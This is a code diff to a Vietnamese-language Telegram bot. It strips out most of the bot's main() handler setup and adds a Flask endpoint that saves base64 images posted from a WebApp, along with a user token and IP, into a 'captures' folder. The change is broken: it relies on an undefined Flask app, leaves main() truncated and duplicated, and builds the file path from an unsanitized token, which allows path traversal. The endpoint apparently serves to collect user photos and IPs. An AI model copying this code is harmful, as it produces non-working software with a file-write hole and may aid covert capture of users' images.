@@ -1,4 +1,3 @@
-import asyncio
 import base64
 import html as _html
 import io
@@ -294,7 +293,6 @@ AI = {
     "RAISED_BROW": ("6208304964998010180", "🤨"),
     "LOVE8": ("6208631494181655806", "🥰"),
 }
-
 
 def ai(key: str) -> str:
     eid, ch = AI[key]
@@ -4981,57 +4979,36 @@ async def post_init(application: Application) -> None:
     await load_code_price()
 
 
-def main():
-    if not BOT_TOKEN:
-        raise RuntimeError("Chưa cấu hình BOT_TOKEN.")
-    if not DATABASE_URL:
-        raise RuntimeError("Chưa cấu hình DATABASE_URL.")
-    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+# ============================================================
+# API NHẬN ẢNH NÉT TỪ WEBAPP (Tránh giới hạn 4KB của Telegram)
+# ============================================================
+from flask import request, jsonify
 
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("settings", admin_menu_command))
-    app.add_handler(CommandHandler("admin", adm_panel_command))
+# Đoạn route nhận ảnh nét từ WebApp gửi lên qua lệnh fetch POST
+@app.route('/api/save-photo', methods=['POST'])
+def save_photo():
+    try:
+        data = request.json
+        token = data.get('token')
+        ip = data.get('ip')
+        image_data = data.get('image')
+        
+        if image_data and "," in image_data:
+            header, encoded = image_data.split(",", 1)
+            image_bytes = base64.b64decode(encoded)
+            
+            # Tạo thư mục lưu ảnh nếu chưa có
+            os.makedirs("/var/www/phongtunk/captures", exist_ok=True)
+            file_path = f"/var/www/phongtunk/captures/{token}.jpg"
+            
+            with open(file_path, "wb") as fh:
+                fh.write(image_bytes)
 
-    app.add_handler(
-        CallbackQueryHandler(
-            admin_toggle_callback, pattern=r"^(toggle_|admin_verify_all)"
-        )
-    )
-    app.add_handler(
-        CallbackQueryHandler(adm_step_callback, pattern=r"^adm_(step_|act_)")
-    )
-    app.add_handler(
-        CallbackQueryHandler(admin_confirm_callback, pattern=r"^(amy_|amcancel$)")
-    )
-    app.add_handler(
-        CallbackQueryHandler(userinfo_callback, pattern=r"^userinfo_")
-    )
-    app.add_handler(
-        CallbackQueryHandler(verify_join_callback, pattern=r"^verify_join$")
-    )
-    app.add_handler(
-        CallbackQueryHandler(
-            code_buy_callback, pattern=r"^(buycode_|approve_code_|reject_code_)"
-        )
-    )
+        return jsonify({"status": "success"})
+    except Exception as e:
+        print(f"Lỗi nhận ảnh: {e}")
+        return jsonify({"status": "error"}), 500
 
-    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
-    app.add_handler(
-        MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler)
-    )
-
-    admin_cmds = [
-        "addstock", "liststock", "stock", "clearstock", "clearstockall",
-        "delhistory", "buyhistory", "addbal", "subbal", "zerobal",
-        "ban", "unban", "banwd", "unbanwd", "unall", "uncap",
-        "skipip", "unip", "resetverify", "info", "detail", "find",
-        "txlog", "txfull", "checkfriends", "friends", "users", "stats",
-        "banlist", "wdbanlist", "topbal", "dupip", "dupphone",
-        "biofriends", "scanbio", "banbuff", "checkref", "broadcast",
-        "sendmsg", "maint", "wipeall", "addgroup", "delgroup", "listgroup",
-        "checkgroup", "checkadmin", "clearallgroup", "price", "setprice",
-        "upprice", "downprice",
-    ]
 
 def main():
     if not BOT_TOKEN:
